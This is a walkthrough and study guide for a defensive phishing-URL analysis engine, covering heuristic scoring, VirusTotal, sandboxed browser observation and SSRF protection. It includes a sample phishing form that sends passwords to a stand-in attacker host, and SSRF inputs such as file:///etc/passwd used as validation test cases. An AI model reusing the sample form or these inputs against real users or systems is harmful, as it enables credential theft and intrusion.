# Phishing Guard V2 — URL Engine Walkthrough

This document explains the complete URL-analysis engine as it exists after the Week 4 milestone. It is written as both an implementation reference and an interview-study guide.

> Safety warning: never test this project with a real malicious URL on your personal machine or normal network. The current browser controls reduce risk but are not a replacement for an isolated VM, container network policy, firewall, and monitored egress proxy.

## 1. What the URL engine is responsible for

The URL engine converts links found in an email into structured, explainable phishing evidence. It performs three complementary forms of analysis:

1. **Static heuristics** inspect the URL string without opening it.
2. **VirusTotal reputation** optionally checks how external security engines classified it.
3. **Dynamic browser analysis** optionally renders selected URLs in headless Chromium and observes behavior such as redirects and credential forms.

The engine deliberately keeps these stages separate. Static analysis is fast and safe, reputation provides outside evidence, and browser execution detects behavior that cannot be seen in the original string.

The final score for one URL is:

```text
per_url_score = max(heuristic_score, vt_score, dynamic_score)
```

The URL score for the whole email is the maximum score among its URLs:

```text
email_url_score = max(per_url_score for every unique URL)
```

This “worst URL wins” rule is intentional: one credential-stealing link is enough to make an otherwise normal email dangerous.

## 2. Main implementation files

| File | Responsibility |
|---|---|
| `app/engines/url_analyzer.py` | Extraction, normalization, static heuristics, VirusTotal, dynamic-stage orchestration, final URL score |
| `app/engines/dynamic/policy.py` | Pure decision function that decides whether a URL should be opened |
| `app/engines/dynamic/models.py` | Browser observation and dynamic result contracts |
| `app/engines/dynamic/dynamic_url_analyzer.py` | Connects policy, browser adapter, and dynamic scorer |
| `app/engines/dynamic/scoring.py` | Deterministic scoring of browser evidence |
| `app/security/url_safety.py` | SSRF-focused URL, DNS, IP, scheme, and port validation |
| `app/integrations/playwright_browser.py` | Headless Chromium execution and observation collection |
| `app/services/scan_service.py` | Runs the URL engine and persists evidence |
| `app/models/url_result.py` | Database columns for per-URL evidence |
| `tests/test_url_*.py` | Static engine and safety unit tests |
| `tests/test_dynamic_url_*.py` | Policy, orchestration, and scoring tests |
| `tests/test_playwright_*.py` | Redirect-safety and real Chromium integration tests |

## 3. End-to-end data flow

```text
User clicks “Run Scan”
        |
        v
POST /scans/{email_id}
        |
        | creates Scan(status="pending") and returns HTTP 202
        v
FastAPI BackgroundTasks
        |
        v
ScanService.run_scan_by_id(scan_id)
        |
        +--> TextAnalyzer
        |
        +--> UrlAnalyzer
        |      |
        |      +--> extract and normalize URLs
        |      +--> static heuristic score
        |      +--> optional VirusTotal lookup
        |      +--> dynamic policy gate
        |      +--> URL safety validation
        |      +--> redirect preflight
        |      +--> Playwright Chromium observation
        |      +--> dynamic evidence score
        |      +--> max(static, VT, dynamic)
        |
        +--> AttachmentAnalyzer
        |
        v
Verdict + UrlResult rows persisted
        |
        v
Frontend polls GET /scans/{scan_id} every 2 seconds
        |
        v
Status becomes complete/error and evidence is displayed
```

## 4. Stage 1 — URL extraction

`UrlAnalyzer._extract_and_deduplicate()` examines both the plain-text and HTML versions of the email.

Sources include:

- `http://` and `https://` strings found in plain text;
- HTML `href` attributes;
- HTML `src` attributes;
- HTML form `action` attributes;
- URL strings appearing in visible HTML text.

Relative links and non-HTTP schemes are ignored. The extracted set is normalized, deduplicated, and sorted so test results are deterministic.

### Extraction example

Input:

```html
<p>Verify at https://Example.com/login?utm_source=email&id=42</p>
<a href="https://example.com/login?id=42">Continue</a>
<img src="https://cdn.example.com/logo.png">
```

Normalized unique results:

```text
https://cdn.example.com/logo.png
https://example.com/login?id=42
```

The two login URLs become one result because the tracking parameter is removed.

## 5. Stage 2 — normalization and static filtering

`UrlAnalyzer._normalize()` performs the initial static normalization:

- percent-decodes the URL;
- lowercases the scheme and host;
- removes the fragment;
- removes common tracking parameters such as `utm_*`, `fbclid`, `gclid`, `ref`, and `mc_*`;
- preserves the path and remaining query parameters.

The static extractor also rejects obvious local destinations such as `localhost`, `127.0.0.1`, `10.0.0.0/8`, `192.168.0.0/16`, and `172.16.0.0/12`.

This early filter is useful, but it is not the primary browser security boundary. The stronger `UrlSafetyValidator` resolves DNS and checks every answer immediately before network access.

## 6. Stage 3 — static heuristic scoring

The static scorer applies additive, explainable rules and caps the result at 100.

| Rule | Score | Example |
|---|---:|---|
| Unencrypted HTTP | +15 | `http://example.com` |
| IPv4 address used as host | +35 | `http://203.0.113.10/login` |
| High-risk TLD | +20 | `https://account-check.xyz` |
| Known URL shortener | +20 | `https://bit.ly/...` |
| Brand text on the wrong registered domain | +40 | `paypa1-login.example.net` |
| Excessive subdomains | +15 | `login.security.account.example.com` |
| URL longer than 200 characters | +10 | Obfuscated query/path |
| High-entropy path | +15 | Random-looking encoded path |
| `@` in authority section | +25 | User-info/host confusion |
| Multiple `http` strings | +20 | Embedded redirect URL |

Registered-domain comparisons use `tldextract` with its bundled suffix data, so `login.example.co.uk` is treated as belonging to `example.co.uk`, not `co.uk`. Runtime scoring does not download the public suffix list.

### Static example

```text
http://paypa1-login.example.xyz/verify/account
```

Possible evidence:

```text
+15 Unencrypted HTTP connection
+20 High-risk TLD: .xyz
+40 Brand impersonation: “paypa1” on example.xyz
-----------------------------------------------
 75 heuristic score
```

Since this score is at least 70, the policy does not need to open the page: the static evidence is already strong.

## 7. Stage 4 — optional VirusTotal reputation

If `VIRUSTOTAL_API_KEYS` contains one or more keys, `_check_virustotal()` queries VirusTotal API v3 using the URL-safe Base64 identifier.

Multiple keys are rotated round-robin. This distributes requests but does not replace proper rate-limit handling.

The score is calculated as:

```text
vt_score = ((malicious + 0.5 * suspicious) / total_engines) * 100
```

The score is capped at 100.

Behavior by response:

| Response | Engine behavior |
|---|---|
| `200` | Reads `last_analysis_stats` and calculates score |
| `404` | Submits the URL for future analysis and records that it is not yet analyzed |
| `429` | Records rate limiting and continues with other evidence |
| Other error | Records a short error and continues |
| No key | Skips the lookup |

If VirusTotal reports at least one malicious engine, dynamic analysis is skipped. Opening a URL already known to be malicious would create risk without adding enough value.

## 8. Stage 5 — dynamic-analysis policy gate

Dynamic analysis is not run for every link. `should_run_dynamic_url()` is a pure, easily tested function.

### A URL is not opened when

- `DYNAMIC_URL_ENABLED=false`;
- the per-scan URL or time budget is exhausted;
- VirusTotal already reports the URL as malicious;
- static/VT score is 70 or higher;
- the URL has low risk and no high-value trigger.

### A URL is opened when

- its static score is ambiguous: 20–69;
- it is a known shortener;
- it contains a high-value flag such as brand impersonation, embedded redirect, IP host, or `@` obfuscation.

### Policy examples

| Static state | Open? | Reason |
|---|---:|---|
| Score 5, no flags | No | Low static risk |
| Score 35 | Yes | Ambiguous static score |
| Score 80 | No | Already high risk |
| Score 10, shortener | Yes | Destination is hidden |
| VT malicious count 3 | No | Already malicious in VirusTotal |
| Scan already visited 3 URLs | No | Budget exhausted |

The policy returns both a Boolean decision and a reason, which becomes a status such as `skipped:disabled` or `skipped:already_high_risk`.

## 9. Stage 6 — SSRF and navigation safety

Opening attacker-controlled URLs creates a Server-Side Request Forgery risk. An attacker could try to make the scanner access:

- localhost services;
- the PostgreSQL container;
- cloud metadata endpoints;
- private IPv4 networks;
- IPv6 loopback or link-local addresses;
- a public domain that redirects to a private address;
- unusual ports running internal services.

`UrlSafetyValidator.validate()` applies these controls:

1. Parse the URL and port.
2. Allow only `http` and `https`.
3. Require a hostname.
4. Reject embedded username/password credentials.
5. Allow only configured ports, defaulting to 80 and 443.
6. convert internationalized domains to normalized IDNA ASCII;
7. resolve every A and AAAA result;
8. require every resolved IP address to be globally routable;
9. normalize the URL and remove its fragment.

The “every DNS answer must be public” rule prevents a hostname with a mixture of public and private answers from slipping through.

### Redirect validation

Server redirects are first resolved with an `httpx.AsyncClient` configured with `follow_redirects=False` and `trust_env=False`. Every `Location` target is validated before the next request.

The browser context also routes requests through the validator. Main-document navigation requests are counted and blocked if they exceed `DYNAMIC_URL_MAX_REDIRECTS`.

This two-layer approach exists because relying only on the original URL is not sufficient: a safe-looking public link may redirect to an unsafe destination.

### Safety error examples

| Input | Error code |
|---|---|
| `file:///etc/passwd` | `unsupported_scheme` |
| `http://localhost/admin` | `non_public_ip` after resolution or local filtering |
| `http://127.0.0.1/` | `non_public_ip` |
| `https://user:pass@example.com/` | `embedded_credentials` |
| `https://example.com:5432/` | `blocked_port` |
| Unresolvable domain | `dns_failure` |

## 10. Stage 7 — browser observation

`PlaywrightBrowserAdapter.observe()` launches Chromium in headless mode. It does not click, type, submit a form, or intentionally download a file.

For each URL it creates a new browser context with:

- `accept_downloads=False`;
- service workers blocked;
- HTTPS errors not ignored;
- a fixed defensive-research user agent;
- a fixed viewport;
- request routing and URL revalidation;
- dialog dismissal;
- popup closure;
- download cancellation.

A fresh context limits cookie, storage, and session sharing between analyzed URLs.

### Captured evidence

`BrowserObservation` records:

| Field | Meaning |
|---|---|
| `attempted` | Whether browser navigation was attempted |
| `final_url` | URL visible after navigation |
| `redirect_chain` | Validated navigation sequence |
| `page_title` | Rendered document title |
| `has_password_input` | Rendered DOM contains `input[type=password]` |
| `has_login_form` | Password input appears inside a form |
| `external_form_action` | Credential form submits to another registered domain |
| `download_attempted` | Page initiated a download |
| `popup_attempted` | Page opened another page/window |
| `tls_error` | Chromium reported a certificate/TLS failure |
| `screenshot_path` | Stored screenshot evidence |
| `elapsed_ms` | Dynamic-stage execution time |
| `error_code` / `error_detail` | Bounded failure information |

After `DOMContentLoaded`, the adapter waits for `DYNAMIC_URL_RENDER_DELAY_MS`. This gives simple JavaScript enough time to add forms to the DOM without allowing an unbounded wait.

Screenshots are stored under:

```text
{DYNAMIC_URL_SCREENSHOT_DIR}/{scan_id}/{sha256(normalized_url)}.png
```

Using a hash avoids unsafe filenames and prevents the raw URL from appearing in the filesystem path.

## 11. Stage 8 — dynamic scoring

Dynamic scoring is deterministic and explainable:

| Browser evidence | Score |
|---|---:|
| Final registered domain differs from original | +25 |
| Three or more redirects | +10 |
| Password input in rendered DOM | Context flag, +0 |
| Credential form submits to another domain | +40 |
| TLS/certificate error | +20 |
| Automatic download attempted | +25 |
| Popup attempted | +10 |

The total is capped at 100.

### Dynamic example

Suppose an email contains:

```text
https://short.example/verify
```

Browser behavior:

```text
https://short.example/verify
  -> https://tracking.example/click/abc
  -> https://account-check.example.net/login
```

Rendered page:

```html
<form action="https://collector.attacker.example/submit">
  <input name="email">
  <input type="password" name="password">
</form>
```

Dynamic score:

```text
+25 final registered domain changed
+ 0 password input present (context evidence)
+40 credential form submits to another domain
------------------------------------------------
 65 dynamic score
```

If the original heuristic score was 20 and VT score was 0:

```text
final URL score = max(20, 0, 65) = 65
```

## 12. Time and resource budgets

The engine has multiple limits because browser analysis is expensive and attacker-controlled pages may never settle.

| Setting | Default | Scope |
|---|---:|---|
| `DYNAMIC_URL_NAVIGATION_TIMEOUT_SECONDS` | 12 | One `page.goto()` |
| `DYNAMIC_URL_TOTAL_TIMEOUT_SECONDS` | 20 | Complete observation of one URL |
| `DYNAMIC_URL_SCAN_BUDGET_SECONDS` | 45 | All dynamic URLs in one email scan |
| `DYNAMIC_URL_MAX_PER_SCAN` | 3 | URLs dynamically attempted per scan |
| `DYNAMIC_URL_MAX_REDIRECTS` | 8 | Server/browser redirect chain |
| `DYNAMIC_URL_RENDER_DELAY_MS` | 1500 | JavaScript render grace period |

URLs are processed from highest existing risk score to lowest, so the most suspicious ambiguous URLs receive the limited browser budget first.

## 13. Status and failure behavior

Dynamic failures do not discard static or VirusTotal results.

Common statuses include:

```text
complete
blocked
timeout
error
skipped:disabled
skipped:budget_exhausted
skipped:already_malicious_in_virustotal
skipped:already_high_risk
skipped:low_static_risk
```

Common browser error codes include:

```text
unsafe_target
preflight_error
browser_unavailable
navigation_timeout
total_timeout
tls_error
navigation_error
redirect_limit
browser_failure
```

The final URL score never decreases because dynamic analysis uses `max(...)`. A browser crash therefore cannot turn a suspicious URL into a safe one.

## 14. Persistence and API exposure

For each unique URL, `ScanService` creates a `url_results` row with:

- original and normalized URL;
- shortener flag;
- heuristic, VirusTotal, dynamic, and final scores;
- VirusTotal counters/errors;
- static flags;
- redirect chain;
- rendered login-form flag;
- inferred SSL validity;
- screenshot path.

Additional dynamic fields, including final URL, popup/download flags, external form action, elapsed time, and detailed dynamic errors, are currently preserved inside `Verdict.breakdown.url.per_url` rather than dedicated database columns.

The public scan response contains the verdict breakdown through:

```text
GET /scans/{scan_id}
```

The frontend uses that structure in the scan-detail and URL-analysis pages.

## 15. Asynchronous scan lifecycle

`POST /scans/{email_id}` returns HTTP 202 instead of holding the browser request open.

Example response:

```json
{
  "status": "queued",
  "scan_id": 42,
  "email_id": 7,
  "verdict": null
}
```

State transition:

```text
pending -> running -> complete
                   \-> error
```

The frontend starts `usePollScan`, calls `GET /scans/42` every two seconds, and stops when it sees `complete`, `error`, or the 180-second polling limit.

FastAPI `BackgroundTasks` is appropriate for the current capstone MVP, but it is not a durable queue. A process restart can lose work. A production design should use Celery/RQ/Arq with Redis or RabbitMQ, retries, idempotency, worker isolation, and queue observability.

## 16. Configuration and operation

### Configuration reference

The values below are the recommended Docker defaults:

```env
# Paths inside the application container
ATTACHMENT_DIR=/app/uploads
MODEL_PATH=/app/data/phishing_model.joblib

# Attachment engine
MAX_ATTACHMENT_BYTES=52428800
ENABLE_VT_HASH_LOOKUP=false

# Dynamic URL analysis
DYNAMIC_URL_ENABLED=false
DYNAMIC_URL_NAVIGATION_TIMEOUT_SECONDS=12
DYNAMIC_URL_TOTAL_TIMEOUT_SECONDS=20
DYNAMIC_URL_SCAN_BUDGET_SECONDS=45
DYNAMIC_URL_MAX_PER_SCAN=3
DYNAMIC_URL_MAX_REDIRECTS=8
DYNAMIC_URL_RENDER_DELAY_MS=1500
DYNAMIC_URL_ALLOWED_PORTS=80,443
DYNAMIC_URL_SCREENSHOT_DIR=/app/uploads/url_screenshots
DYNAMIC_URL_SCREENSHOT_RETENTION_DAYS=14
```

| Variable | Meaning and management guidance |
|---|---|
| `ATTACHMENT_DIR` | Root used for stored attachment files. The Compose volume keeps `/app/uploads` persistent. |
| `MODEL_PATH` | Joblib phishing-model file loaded by the text engine. The file must exist inside the running environment. |
| `MAX_ATTACHMENT_BYTES` | Per-file in-memory analysis limit. `52428800` is 50 MiB. Larger files are skipped and flagged. |
| `ENABLE_VT_HASH_LOOKUP` | Enables attachment SHA-256 reputation lookup. It does not upload the file. Keep false when no VT key/quota is available. |
| `DYNAMIC_URL_ENABLED` | Master browser kill switch. False still permits static and optional VT URL analysis. |
| `DYNAMIC_URL_NAVIGATION_TIMEOUT_SECONDS` | Limit for Chromium's main navigation operation. |
| `DYNAMIC_URL_TOTAL_TIMEOUT_SECONDS` | Hard limit for preflight, launch, rendering, evidence capture, and cleanup for one URL. |
| `DYNAMIC_URL_SCAN_BUDGET_SECONDS` | Maximum browser time allocated across all URLs in one email scan. |
| `DYNAMIC_URL_MAX_PER_SCAN` | Maximum number of policy-approved URLs dynamically attempted in one scan. Only one candidate per registrable domain is attempted. |
| `DYNAMIC_URL_MAX_REDIRECTS` | Maximum accepted redirect/navigation chain before blocking. |
| `DYNAMIC_URL_RENDER_DELAY_MS` | Grace time after DOMContentLoaded for JavaScript-rendered evidence. |
| `DYNAMIC_URL_ALLOWED_PORTS` | Destination-port allowlist. Keep `80,443` unless a reviewed use case requires more. |
| `DYNAMIC_URL_SCREENSHOT_DIR` | Screenshot root. Compose bind-mounts it to host folder `uploads/url_screenshots`; the API serves evidence at `/artifacts/url-screenshots/{scan_id}/{filename}`. |
| `DYNAMIC_URL_SCREENSHOT_RETENTION_DAYS` | Intended retention policy. Automatic deletion is not implemented yet, so operations must currently perform cleanup. |

`/app/...` refers to paths inside the Docker container. For a backend launched directly from the Windows workspace, use values such as:

```env
ATTACHMENT_DIR=uploads
MODEL_PATH=data/phishing_model.joblib
DYNAMIC_URL_SCREENSHOT_DIR=uploads/url_screenshots
```

### Enable locally

```powershell
python -m pip install -e .
python -m playwright install chromium
```

In `.env`:

```env
DYNAMIC_URL_ENABLED=true
DYNAMIC_URL_SCREENSHOT_DIR=uploads/url_screenshots
```

Restart the backend after changing settings because `get_settings()` is cached.

### Enable with Docker

The Dockerfile already installs Chromium and its Linux dependencies. Set `DYNAMIC_URL_ENABLED=true` in `.env`, then rebuild:

```powershell
docker compose up --build
```

### Disable immediately

```env
DYNAMIC_URL_ENABLED=false
```

Restart the backend. Static and VirusTotal analysis will continue.

### Tune conservatively

- Lower `DYNAMIC_URL_MAX_PER_SCAN` to reduce browser load.
- Lower total and scan budgets for shared development machines.
- Keep allowed ports at `80,443` unless a reviewed requirement exists.
- Do not enable `ignore_https_errors`; TLS errors are useful evidence.
- The current local-development artifact route has no authentication. Add authorization and retention cleanup before production use.

## 17. Testing strategy

### Unit tests

- `test_url_safety.py`: schemes, credentials, ports, DNS answers, public/private IP handling.
- `test_dynamic_url_policy.py`: every policy decision branch.
- `test_dynamic_url_scoring.py`: domain comparison, evidence weights, and score cap.
- `test_dynamic_url_analyzer.py`: orchestration through a fake browser adapter.
- `test_url_analyzer.py`: extraction, heuristics, VT handling, and dynamic merge behavior.

These should be fast, deterministic, and independent of the public internet.

### Integration tests

- `test_playwright_redirect_safety.py` uses a mocked HTTP transport to prove a redirect to a private address is rejected.
- `test_playwright_browser_integration.py` starts a harmless loopback-only test server, launches real Chromium, follows a redirect, waits for JavaScript to render a password form, and verifies screenshot evidence.

The integration test deliberately injects a test-only validator that permits loopback. Production `UrlSafetyValidator` still blocks loopback.

### Run tests

```powershell
# All tests
pytest -q

# URL-engine unit tests only
pytest -q tests/test_url_safety.py tests/test_url_analyzer.py `
  tests/test_dynamic_url_policy.py tests/test_dynamic_url_scoring.py `
  tests/test_dynamic_url_analyzer.py

# Real Chromium test
pytest -q tests/test_playwright_browser_integration.py

# Coverage
pytest --cov=app --cov-report=term-missing --cov-report=html
```

## 18. Current limitations and hardening roadmap

### Current limitations

- Chromium runs inside the application container/process environment; this is not a hardened malware sandbox.
- The preflight performs an HTTP GET and Chromium then performs another GET, so a stateful endpoint may behave differently on the second request.
- DNS can change between validation and connection. Network-level egress restrictions are still required to mitigate DNS rebinding fully.
- Background tasks are not durable across process restarts.
- Screenshot retention days are configured but automatic cleanup is not implemented yet.
- Browser concurrency is not centrally limited across multiple scans.
- Some dynamic evidence exists only in the verdict JSON rather than typed database columns.
- No controlled interaction is performed, so behavior that requires a click is not observed.

### Recommended production hardening

1. Run browser workers in isolated containers or VMs with non-root users and read-only filesystems.
2. Enforce outbound traffic policy at firewall/proxy level, not only in Python.
3. Block private, metadata, multicast, and reserved networks at the network layer.
4. Add a durable queue, retries, dead-letter handling, and per-domain rate limits.
5. Store screenshots in object storage with authorization and automatic expiry.
6. Add observability for queue time, browser crashes, timeouts, and policy reasons.
7. Add an Alembic migration for the remaining structured evidence fields.
8. Evaluate against a labeled benign/phishing URL dataset without browsing live malicious infrastructure.

## 19. Interview explanation

A concise explanation:

> “I extended a static phishing URL engine with policy-gated browser analysis. Every link is first normalized and scored with deterministic heuristics and optional VirusTotal reputation. Only ambiguous or concealed destinations enter the browser stage. Before any request, the engine validates scheme, port, DNS answers, public routability, and every redirect target to reduce SSRF risk. A fresh Playwright Chromium context captures redirect, rendered credential-form, popup, download, TLS, and screenshot evidence without interacting with the page. A pure scorer converts that evidence into explainable flags, and the final result takes the maximum of static, reputation, and dynamic scores so browser failure cannot lower existing risk.”

Questions you should be ready to answer:

- Why not open every URL?
- Why is policy a pure function?
- Why check every DNS answer and redirect?
- Why use registered domains rather than raw hostnames?
- Why use the maximum score rather than an average?
- Why create a fresh browser context per URL?
- What remains unsafe without network-level isolation?
- Why are integration tests based on a harmless local server?
- Why is FastAPI `BackgroundTasks` temporary rather than the final architecture?

## 20. Primary references

- [Playwright Python browser contexts](https://playwright.dev/python/docs/api/class-browsercontext)
- [Playwright Python network interception](https://playwright.dev/python/docs/network)
- [Playwright Python CI](https://playwright.dev/python/docs/ci)
- [FastAPI background tasks](https://fastapi.tiangolo.com/tutorial/background-tasks/)
- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
